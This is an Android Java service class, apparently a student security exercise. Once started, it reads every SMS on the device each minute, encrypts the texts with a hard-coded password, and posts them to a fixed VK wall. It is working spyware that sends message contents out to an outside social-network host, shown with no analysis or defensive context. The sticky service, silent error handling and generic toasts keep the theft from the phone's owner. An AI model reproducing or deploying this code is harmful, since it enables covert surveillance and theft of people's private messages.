package com.example.mobile_1_4;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import com.vk.sdk.api.VKApi;
import com.vk.sdk.api.VKApiConst;
import com.vk.sdk.api.VKError;
import com.vk.sdk.api.VKParameters;
import com.vk.sdk.api.VKRequest;
import com.vk.sdk.api.VKResponse;
import com.vk.sdk.api.model.VKWallPostResult;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class MyService extends Service {

    // Создаем таймер
    private Timer myTimer = new Timer();
    private Crypto crypto = new Crypto();
    private String pass = "ibksstudent";

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(this, "Service created", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Service stopped", Toast.LENGTH_SHORT).show();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
        // Устанавливаем таймер вызова функции работы с SMS
        myTimer.schedule(new TimerTask() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void run() {
                try {
                    sms_work();
                } catch (Exception e) {
                    //e.printStackTrace();
                }
            }
        }, 0, 60000);

        return Service.START_STICKY;
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public void sms_work() throws Exception {
        // Получение листа SMS сообщений в зашифрованном виде
        List<String> sms_text = getAllSmsFromProvider();
        // Добавление их в один String
        String message = "";
        for (int i = 0; i < sms_text.size(); i++) {
            message += Integer.toString(i + 1) + ") ";
            message += sms_text.get(i);
            message += "\n";
        }
        // Отправка сообщения на стену в ВК
        VKRequest post = VKApi.wall().post(VKParameters.from(
                VKApiConst.OWNER_ID, "198762348",
                VKApiConst.MESSAGE, message
        ));
        post.setModelClass(VKWallPostResult.class);
        post.executeWithListener(new VKRequest.VKRequestListener() {
            @Override
            public void onComplete(VKResponse response) {
                VKWallPostResult result = (VKWallPostResult) response.parsedModel;
                super.onComplete(response);
            }

            @Override
            public void onError(VKError error) {
            }
        });
    }

    // Получение List текстов SMS в зашифрованном виде
    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public List<String> getAllSmsFromProvider() throws Exception {
        List<String> lstSms = new ArrayList<String>();
        // Пользуемся услугами контент провайдера
        // Cursor - набор строк в табличном виде
        Cursor c = getContentResolver().query(Uri.parse("content://sms"),
                null, null, null,null);
        int totalSMS = c.getCount();
        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                lstSms.add(crypto.encrypt(pass.getBytes("UTF-16LE"), c.getString(12).getBytes("UTF-16LE")));
                c.moveToNext();
            }
        }
        c.close();
        return lstSms;
    }
}
